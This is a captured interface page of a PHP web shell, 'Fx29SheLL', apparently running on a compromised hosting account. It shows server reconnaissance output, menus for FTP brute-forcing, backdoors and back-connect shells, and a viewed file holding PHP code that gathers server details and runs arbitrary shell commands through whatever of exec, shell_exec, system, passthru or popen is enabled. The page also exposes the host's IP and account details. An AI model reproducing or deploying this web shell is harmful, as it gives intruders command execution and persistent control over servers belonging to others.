
FaTaLisTiCz_Fx Fx29SheLL v1.5 09.2009
..::[ WWW.MARIAOZAWA.ORG ]::..

Software : Apache. PHP/4.4.9 - php.ini
SAFE MODE is OFF (Not Secure)
OS : Linux serv01.siteground10.com 2.6.28.5-grsec-sg2 #6 SMP Fri Feb 20 02:45:11 CST 2009 i686
User ID : uid=32854(shopdv) gid=32823(shopdv) groups=32823(shopdv)
	

Server IP : 67.15.172.4 - Your IP : 110.138.183.3
Freespace : 487.16 GB of 902.2 GB (54%)

MySQL: ON MSSQL: OFF Oracle: OFF MSSQL: OFF PostgreSQL: ON cURL: ON WGet: ON Fetch: OFF Perl: ON
Disabled Functions: NONE
Enumerate Security Info Processes MySQL PHP-Code Encoder Mailer milw0rm it! Md5-Lookup Word-Lists Toolz Self-Kill Feedback Update About
FTP-Brute Backdoor Back-Connect
Home Back Forward Up Search Buffer

/home/shopdv/public_html/test/ - drwxr-xr-x
Directory:
Viewing file:     p2.txt (2.11 KB)      -rw-r--r--
Select action/file-type:
(+) | (+) | (+) | Code (+) | Session (+) | (+) | SDB (+) | (+) | (+) | (+) | (+) | (+) |

<!--
##[ ZFxID2 ]##
fx("ID","Shiro"."Hige");
$P   = @getcwd();
$IP  = @getenv("SERVER_ADDR");
$UID = fx29exec("id");
fx("SAFE",@safemode()?"ON":"OFF");
fx("OS",@PHP_OS);
fx("UNAME",@php_uname());
fx("SERVER",($IP)?$IP:"-");
fx("USER",@get_current_user());
fx("UID",($UID)?$UID:"uid=".@getmyuid()." gid=".@getmygid());
fx("DIR",$P);
fx("PERM",(@is_writable($P))?"[W]":"[R]");
fx("HDD","Used: ".hdd("used")." Free: ".hdd("free")." Total: ".hdd("total"));
fx("DISFUNC",@getdisfunc());
##[ ZFXSHEXEC ]##
function fx($t,$c) { echo "$t: "; echo (is_array($c))?join(" ",$c):$c; echo "<br>"; }
function safemode() { return (@ini_get("safe_mode") OR eregi("on",@ini_get("safe_mode")) ) ? TRUE : FALSE; }
function getdisfunc() { $rez = explode(",",@ini_get("disable_functions")); return (!empty($rez))?$rez:array(); }
function enabled($func) { return (function_exists($func) && is_callable($func) && !in_array($func,getdisfunc())) ? TRUE : FALSE; }
function fx29exec($cmd) {
  if (enabled("exec")) { exec($cmd,$o); $rez = join("\r\n",$o); }
  elseif (enabled("shell_exec")) { $rez = shell_exec($cmd); }
  elseif (enabled("system")) { @ob_start(); @system($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }  
  elseif (enabled("passthru")) { @ob_start(); passthru($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }
  elseif (enabled("popen") && is_resource($h = popen($cmd.' 2>&1', 'r')) ) { while ( !feof($h) ) { $rez .= fread($h, 2096);  } pclose($h); }
  else { $rez = "Error!"; }
  return $rez;
}
function vsize($size) {
  if (!is_numeric($size)) { return FALSE; }
  else {
    if ( $size >= 1073741824 ) { $size = round($size/1073741824*100)/100 ." GB"; }
    elseif ( $size >= 1048576 ) { $size = round($size/1048576*100)/100 ." MB"; }
    elseif ( $size >= 1024 ) { $size = round($size/1024*100)/100 ." KB"; }
    else { $size = $size . " B"; }
    return $size;
  }
}
function hdd($type) {
  $P = @getcwd(); $T = @disk_total_space($P); $F = @disk_free_space($P); $U = $T - $U;
  $hddspace = array("total" => vsize($T), "free"  => vsize($F), "used"  => vsize($U));
  return $hddspace[$type];
}
die("Jatimcom");
?>

.: COMMANDS PANEL :.
Command: 	
-
Quick Commands: 	
-
Kernel Info: 	
-
Upload: 	
- [OK]
PHP Filesystem: 	
File/Dir/URL: To/Max: [Fx29Sh] [psyBNC] [Eggdrop]
Search: 	
  - regexp 
Make File: 	
- [OK]
View File: 	
-
.:[ Edit By MARIA | WWW.MARIAOZAWA.ORG | Generated: 0.0124 seconds ]:.
